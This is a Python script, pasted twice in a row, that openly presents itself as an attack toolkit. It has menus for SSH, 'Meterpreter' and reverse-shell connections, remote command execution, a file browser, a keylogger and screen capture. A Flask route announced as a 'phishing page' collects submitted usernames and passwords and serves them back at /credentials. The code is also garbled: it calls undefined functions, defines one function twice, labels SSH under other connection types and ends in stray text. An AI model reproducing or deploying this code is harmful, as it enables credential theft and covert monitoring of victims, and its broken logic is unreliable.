import os
import paramiko
import pyautogui
import keyboard
import subprocess
import time
import requests
import tempfile
from flask import Flask, render_template, redirect, request, session, jsonify
from flask_session import Session

app = Flask(__name__)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

screenshot_dir = tempfile.mkdtemp()

def main():
    print("Select an OS:")
    print("1. macOS")
    print("2. Windows")
    print("3. Android")
    print("4. iOS")

    os_choice = input("Enter the number of your choice: ")

    if os_choice == "1":
        macos_selector()
    elif os_choice == "2":
        windows_selector()
    elif os_choice == "3":
        android_selector()
    elif os_choice == "4":
        ios_selector()
    else:
        print("Invalid choice. Please try again.")
        main()

def macos_selector():
    print("Select a type of connection:")
    print("1. SSH")
    print("2. Meterpreter")
    print("3. Reverse Shell")

    connection_choice = input("Enter the number of your choice: ")

    if connection_choice == "1":
        ssh_connection()
    elif connection_choice == "2":
        meterpreter_connection()
    elif connection_choice == "3":
        reverse_shell_connection()
    else:
        print("Invalid choice. Please try again.")
        macos_selector()

def remote_connection(ip_address, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip_address, username=username, password=password)

    while True:
        print("Select an action:")
        print("1. Run a command")
        print("2. File browser")
        print("3. Process list")
        print("4. Keylogger")
        print("5. Screen mirroring")
        print("6. Exit")

        action_choice = input("Enter the number of your choice: ")

        if action_choice == "1":
            print("Enter a command to run on the remote machine:")
            command = input()
            stdin, stdout, stderr = ssh_client.exec_command(command)
            print(stdout.read().decode())
        elif action_choice == "2":
            file_browser()
        elif action_choice == "3":
            process_list()
        elif action_choice == "4":
            keylogger()
        elif action_choice == "5":
            screen_mirroring()
        elif action_choice == "6":
            break
        else:
            print("Invalid choice. Please try again.")

def ssh_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def meterpreter_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def ios_selector():
    print("iOS selector is not implemented yet.")

def reverse_shell_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def file_browser():
    print("File browser started. Type 'quit' to exit.")
    current_path = os.getcwd()
    while True:
        print(f"Current path: {current_path}")
        file_path = input("Enter a file path or '..' to go up a directory, or 'quit' to exit: ")
        if file_path == "quit":
            break
        elif file_path == "..":
            current_path = os.path.dirname(current_path)
        elif os.path.isdir(os.path.join(current_path, file_path)):
             current_path = os.path.join(current_path, file_path)
        elif os.path.isfile(os.path.join(current_path, file_path)):
            try:
                with open(os.path.join(current_path, file_path), 'r') as f:
                    print(f.read())
            except Exception as e:
                print(f"Error reading file: {e}")
        else:
            try:
                files = os.listdir(current_path)
                print(files)
            except FileNotFoundError:
                print("File not found.")


def process_list():
    print("Process list started. Type 'quit' to exit.")
    while True:
        command = input("Enter a command to run: ")
        if command == "quit":
            break
        try:
            process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if stderr:
                print(f"Error running command: {stderr.decode()}")
            else:
                print(stdout.decode())
        except FileNotFoundError:
            print("Command not found.")
        except Exception as e:
            print(f"An error occurred: {e}")

def keylogger():
    print("Keylogger started. Type 'quit' to exit. Logging to keylog.txt")
    with open("keylog.txt", "a") as f:
        def on_key_press(event):
            f.write(event.name + "\n")
        keyboard.hook(on_key_press)
        input("Press enter to stop logging: ")
        keyboard.unhook(on_key_press)

def screen_mirroring():
    print("Screen mirroring started. Type 'quit' to exit.")
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = str(int(time.time()))
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        print(f"Screenshot saved to {screenshot_path}")
        if input("Press enter to take another screenshot, or type 'quit' to exit: ") == "quit":
            break

@app.route('/screenshots')
def list_screenshots():
    screenshots = [f for f in os.listdir(screenshot_dir) if f.startswith('screenshot_')]
    return render_template('screenshots.html', screenshots=screenshots)

@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        session['username'] = username
        session['password'] = password
        session['ip_address'] = ip_address
        return jsonify({'message': 'Credentials received successfully'})
    else:
        return 'Welcome to the phishing page'

@app.route('/credentials', methods=['GET'])
def get_credentials():
    if 'username' in session and 'password' in session and 'ip_address' in session:
        return jsonify({'username': session['username'], 'password': session['password'], 'ip_address': session['ip_address']})
    else:
        return jsonify({'message': 'No credentials found'})

def ios_selector():
    print("Select an iOS distribution:")
    print("1. iOS 14")
    print("2. iOS 15")
    print("3. iOS 16")

    ios_choice = input("Enter the number of your choice: ")

    if ios_choice == "1":
        print("iOS 14 selected.")
        # Add specific functionality for iOS 14 here
    elif ios_choice == "2":
        print("iOS 15 selected.")
        # Add specific functionality for iOS 15 here
    elif ios_choice == "3":
        print("iOS 16 selected.")
        # Add specific functionality for iOS 16 here
    else:
        print("Invalid choice. Please try again.")
        ios_selector()

if __name__ == "__main__":
    from flask import send_from_directory
    app.run(debug=True)
import os
import paramiko
import pyautogui
import keyboard
import subprocess
import time
import requests
import tempfile
from flask import Flask, render_template, redirect, request, session, jsonify
from flask_session import Session

app = Flask(__name__)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

screenshot_dir = tempfile.mkdtemp()

def main():
    print("Select an OS:")
    print("1. macOS")
    print("2. Windows")
    print("3. Android")
    print("4. iOS")

    os_choice = input("Enter the number of your choice: ")

    if os_choice == "1":
        macos_selector()
    elif os_choice == "2":
        windows_selector()
    elif os_choice == "3":
        android_selector()
    elif os_choice == "4":
        ios_selector()
    else:
        print("Invalid choice. Please try again.")
        main()

def macos_selector():
    print("Select a type of connection:")
    print("1. SSH")
    print("2. Meterpreter")
    print("3. Reverse Shell")

    connection_choice = input("Enter the number of your choice: ")

    if connection_choice == "1":
        ssh_connection()
    elif connection_choice == "2":
        meterpreter_connection()
    elif connection_choice == "3":
        reverse_shell_connection()
    else:
        print("Invalid choice. Please try again.")
        macos_selector()

def remote_connection(ip_address, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip_address, username=username, password=password)

    while True:
        print("Select an action:")
        print("1. Run a command")
        print("2. File browser")
        print("3. Process list")
        print("4. Keylogger")
        print("5. Screen mirroring")
        print("6. Exit")

        action_choice = input("Enter the number of your choice: ")

        if action_choice == "1":
            print("Enter a command to run on the remote machine:")
            command = input()
            stdin, stdout, stderr = ssh_client.exec_command(command)
            print(stdout.read().decode())
        elif action_choice == "2":
            file_browser()
        elif action_choice == "3":
            process_list()
        elif action_choice == "4":
            keylogger()
        elif action_choice == "5":
            screen_mirroring()
        elif action_choice == "6":
            break
        else:
            print("Invalid choice. Please try again.")

def ssh_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def meterpreter_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def ios_selector():
    print("iOS selector is not implemented yet.")

def reverse_shell_connection():
    print("Enter the IP address of the remote machine:")
    ip_address = input()
    print("Enter the username of the remote machine:")
    username = input()
    print("Enter the password of the remote machine:")
    password = input()
    remote_connection(ip_address, username, password)

def file_browser():
    print("File browser started. Type 'quit' to exit.")
    current_path = os.getcwd()
    while True:
        print(f"Current path: {current_path}")
        file_path = input("Enter a file path or '..' to go up a directory, or 'quit' to exit: ")
        if file_path == "quit":
            break
        elif file_path == "..":
            current_path = os.path.dirname(current_path)
        elif os.path.isdir(os.path.join(current_path, file_path)):
             current_path = os.path.join(current_path, file_path)
        elif os.path.isfile(os.path.join(current_path, file_path)):
            try:
                with open(os.path.join(current_path, file_path), 'r') as f:
                    print(f.read())
            except Exception as e:
                print(f"Error reading file: {e}")
        else:
            try:
                files = os.listdir(current_path)
                print(files)
            except FileNotFoundError:
                print("File not found.")


def process_list():
    print("Process list started. Type 'quit' to exit.")
    while True:
        command = input("Enter a command to run: ")
        if command == "quit":
            break
        try:
            process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if stderr:
                print(f"Error running command: {stderr.decode()}")
            else:
                print(stdout.decode())
        except FileNotFoundError:
            print("Command not found.")
        except Exception as e:
            print(f"An error occurred: {e}")

def keylogger():
    print("Keylogger started. Type 'quit' to exit. Logging to keylog.txt")
    with open("keylog.txt", "a") as f:
        def on_key_press(event):
            f.write(event.name + "\n")
        keyboard.hook(on_key_press)
        input("Press enter to stop logging: ")
        keyboard.unhook(on_key_press)

def screen_mirroring():
    print("Screen mirroring started. Type 'quit' to exit.")
    while True:
        screenshot = pyautogui.screenshot()
        timestamp = str(int(time.time()))
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_path)
        print(f"Screenshot saved to {screenshot_path}")
        if input("Press enter to take another screenshot, or type 'quit' to exit: ") == "quit":
            break

@app.route('/screenshots')
def list_screenshots():
    screenshots = [f for f in os.listdir(screenshot_dir) if f.startswith('screenshot_')]
    return render_template('screenshots.html', screenshots=screenshots)

@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        session['username'] = username
        session['password'] = password
        session['ip_address'] = ip_address
        return jsonify({'message': 'Credentials received successfully'})
    else:
        return 'Welcome to the phishing page'

@app.route('/credentials', methods=['GET'])
def get_credentials():
    if 'username' in session and 'password' in session and 'ip_address' in session:
        return jsonify({'username': session['username'], 'password': session['password'], 'ip_address': session['ip_address']})
    else:
        return jsonify({'message': 'No credentials found'})

def ios_selector():
    print("Select an iOS distribution:")
    print("1. iOS 14")
    print("2. iOS 15")
    print("3. iOS 16")

    ios_choice = input("Enter the number of your choice: ")

    if ios_choice == "1":
        print("iOS 14 selected.")
        # Add specific functionality for iOS 14 here
    elif ios_choice == "2":
        print("iOS 15 selected.")
        # Add specific functionality for iOS 15 here
    elif ios_choice == "3":
        print("iOS 16 selected.")
        # Add specific functionality for iOS 16 here
    else:
        print("Invalid choice. Please try again.")
        ios_selector()

if __name__ == "__main__":
    from flask import send_from_directory
    app.run(debug=True)
 platform-specific features
